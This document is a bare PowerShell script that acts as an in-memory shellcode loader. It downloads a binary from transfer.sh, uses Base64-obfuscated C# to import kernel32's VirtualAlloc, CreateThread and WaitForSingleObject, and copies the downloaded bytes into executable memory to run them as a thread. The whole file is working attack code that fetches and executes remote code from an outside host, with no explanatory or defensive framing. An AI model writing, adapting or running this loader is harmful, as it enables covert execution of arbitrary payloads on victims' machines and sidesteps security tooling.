$target = "https://transfer.sh/test.bin"
$byteArray = (Invoke-WebRequest -Uri $target).content

$WinAPI = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgAJAAkAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAJAA0ACgAJAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVwBpAG4AMwAyACAAewANAAoACQAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwAQQBsAGwAbwBjAGEAdABpAG8AbgBUAHkAcABlACwAIAB1AGkAbgB0ACAAZgBsAFAAcgBvAHQAZQBjAHQAKQA7AAkAIAAgACAAIAAgACAAIAAgAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIALAAgAEMAaABhAHIAUwBlAHQAIAA9ACAAQwBoAGEAcgBTAGUAdAAuAEEAbgBzAGkAKQBdAA0ACgAJAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AAkAIAAgACAAIAAgACAAIAAgAA0ACgAJAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAFUASQBuAHQAMwAyACAAVwBhAGkAdABGAG8AcgBTAGkAbgBnAGwAZQBPAGIAagBlAGMAdAAoAEkAbgB0AFAAdAByACAAaABIAGEAbgBkAGwAZQAsACAAVQBJAG4AdAAzADIAIABkAHcATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAKQA7AA0ACgAgACAAIAAgAH0ACQAgACAAIAAgACAAIAAgACAA')))
Add-Type $WinAPI;

$size = $byteArray.Length
$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $addr, $size)
$handling = [Win32]::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[Win32]::WaitForSingleObject($handling, 4294967295)
